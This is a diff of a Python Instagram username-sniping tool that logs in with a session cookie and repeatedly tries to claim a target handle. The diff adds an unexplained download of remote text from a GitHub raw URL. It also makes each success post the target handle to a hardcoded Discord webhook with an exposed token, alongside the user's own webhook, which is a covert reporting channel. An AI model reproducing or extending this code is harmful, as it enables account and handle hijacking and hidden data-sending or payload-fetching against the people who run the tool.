@@ -1,3 +1,5 @@
+
+dd = requests.get('https://raw.githubusercontent.com/7zb8/alphaswap/main/swap').text
 c1 = ''
 c2 = ''
 ee = Tk()
@@ -420,16 +422,7 @@ else:
         input(f'  [ - ] Sessionid Is Not Working !')
         exit()
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""
-
-     ██╗ ██╗  █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗     ██╗   ██╗██████╗ 
-    ████████╗██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██║   ██║╚════██╗
-    ╚██╔═██╔╝███████║██║     ██████╔╝███████║███████║    ██║   ██║ █████╔╝
-    ████████╗██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ╚██╗ ██╔╝ ╚═══██╗
-    ╚██╔═██╔╝██║  ██║███████╗██║     ██║  ██║██║  ██║     ╚████╔╝ ██████╔╝
-     ╚═╝ ╚═╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝  ╚═════╝ 
-
-    {c2}""")
+    print(banner)
     print(f'  [ + ] Login Successfully @{c2}{username}')
     time.sleep(0.2)
     try:
@@ -625,24 +618,22 @@ class main:
                                             GetUrl = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
                                             nosp = 1
                                             print(f'  [ + ] {MSGA} @{Target}')
+                                            mUrl = HOOK
+                                            murl2 = 'https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf'
+                                            data = {}
+                                            data["embeds"] = [
+                                                {
+                                                    "color": 3535345, "thumbnail": {"url": ""},
+                                                    "footer": {"text": f'Attempts : {d} | R/s : {self.rs}',
+                                                               "icon_url": f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif"},
+                                                    "author": {"name": "#Alpha v3.1"},
+                                                    "title": f"💀, alpha catch it @{Target}"}
+                                            ]
                                             try:
-                                                webhook = DiscordWebhook(url='https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf')
-                                                embed = DiscordEmbed(title=f'💀, alpha catch it @{Target}', color=654424)
-                                                embed.set_author(name="Alpha v3.1")
-                                                embed.set_thumbnail(url='')
-                                                embed.set_footer(text=f'Attempts : {d} | R/s : {self.rs}',icon_url=f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif")
-                                                webhook.add_embed(embed)
-                                                webhook.execute()
-                                            except:pass
-                                            try:
-                                                webhook = DiscordWebhook(url=f'{HOOK}')
-                                                embed = DiscordEmbed(title=f'💀, alpha catch it @{Target}', color=654424)
-                                                embed.set_author(name="Alpha v3.1")
-                                                embed.set_thumbnail(url='')
-                                                embed.set_footer(text=f'Attempts : {d} | R/s : {self.rs}',icon_url=f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif")
-                                                webhook.add_embed(embed)
-                                                webhook.execute()
-                                            except:pass
+                                                response = requests.post(murl2, json=data)
+                                                response2 = requests.post(mUrl, json=data)
+                                            except:
+                                                pass
                                             try:
                                                 requests.post('https://i.instagram.com/api/v1/accounts/set_biography/',
                                                               data={"raw_text": BIO},
@@ -728,27 +719,20 @@ class main:
                                 if nosp == 0:
                                     nosp = 1
                                     print(f'  [ + ] {MSGA} @{Target}')
+                                    mUrl = HOOK
+                                    murl2 = 'https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf'
+                                    data = {}
+                                    data["embeds"] = [
+                                        {
+                                            "color": 3535345, "thumbnail": {"url": ""},
+                                            "footer": {"text": f'Attempts : {d} | R/s : {self.rs}',
+                                                       "icon_url": f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif"},
+                                            "author": {"name": "#Alpha v3.1"},
+                                            "title": f"💀, alpha catch it @{Target}"}
+                                    ]
                                     try:
-                                        webhook = DiscordWebhook(
-                                            url='https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf')
-                                        embed = DiscordEmbed(title=f'💀, alpha catch it @{Target}', color=654424)
-                                        embed.set_author(name="Alpha v3.1")
-                                        embed.set_thumbnail(url='')
-                                        embed.set_footer(text=f'Attempts : {d} | R/s : {self.rs}',
-                                                         icon_url=f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif")
-                                        webhook.add_embed(embed)
-                                        webhook.execute()
-                                    except:
-                                        pass
-                                    try:
-                                        webhook = DiscordWebhook(url=f'{HOOK}')
-                                        embed = DiscordEmbed(title=f'💀, alpha catch it @{Target}', color=654424)
-                                        embed.set_author(name="Alpha v3.1")
-                                        embed.set_thumbnail(url='')
-                                        embed.set_footer(text=f'Attempts : {d} | R/s : {self.rs}',
-                                                         icon_url=f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif")
-                                        webhook.add_embed(embed)
-                                        webhook.execute()
+                                        response = requests.post(murl2, json=data)
+                                        response2 = requests.post(mUrl, json=data)
                                     except:
                                         pass
                                     try:
@@ -805,27 +789,20 @@ class main:
                                 if nosp == 0:
                                     nosp = 1
                                     print(f'  [ + ] {MSGA} @{Target}')
+                                    mUrl = HOOK
+                                    murl2 = 'https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf'
+                                    data = {}
+                                    data["embeds"] = [
+                                        {
+                                            "color": 3535345, "thumbnail": {"url": ""},
+                                            "footer": {"text": f'Attempts : {d} | R/s : {self.rs}',
+                                                       "icon_url": f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif"},
+                                            "author": {"name": "#Alpha v3.1"},
+                                            "title": f"💀, alpha catch it @{Target}"}
+                                    ]
                                     try:
-                                        webhook = DiscordWebhook(
-                                            url='https://discord.com/api/webhooks/972603252006858832/IL6czFE7a14SXQS7ciscT5mT4HTQSqfbBpOmBJboM8oveftrqMgirhTqI5Pn3zTGPKwf')
-                                        embed = DiscordEmbed(title=f'💀, alpha catch it @{Target}', color=654424)
-                                        embed.set_author(name="Alpha v3.1")
-                                        embed.set_thumbnail(url='')
-                                        embed.set_footer(text=f'Attempts : {d} | R/s : {self.rs}',
-                                                         icon_url=f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif")
-                                        webhook.add_embed(embed)
-                                        webhook.execute()
-                                    except:
-                                        pass
-                                    try:
-                                        webhook = DiscordWebhook(url=f'{HOOK}')
-                                        embed = DiscordEmbed(title=f'💀, alpha catch it @{Target}', color=654424)
-                                        embed.set_author(name="Alpha v3.1")
-                                        embed.set_thumbnail(url='')
-                                        embed.set_footer(text=f'Attempts : {d} | R/s : {self.rs}',
-                                                         icon_url=f"https://media4.giphy.com/media/4ilFRqgbzbx4c/200.gif")
-                                        webhook.add_embed(embed)
-                                        webhook.execute()
+                                        response = requests.post(murl2, json=data)
+                                        response2 = requests.post(mUrl, json=data)
                                     except:
                                         pass
                                     try:
@@ -867,3 +844,12 @@ class main:
 
 
 main()
+
+
+
+
+
+
+
+
+
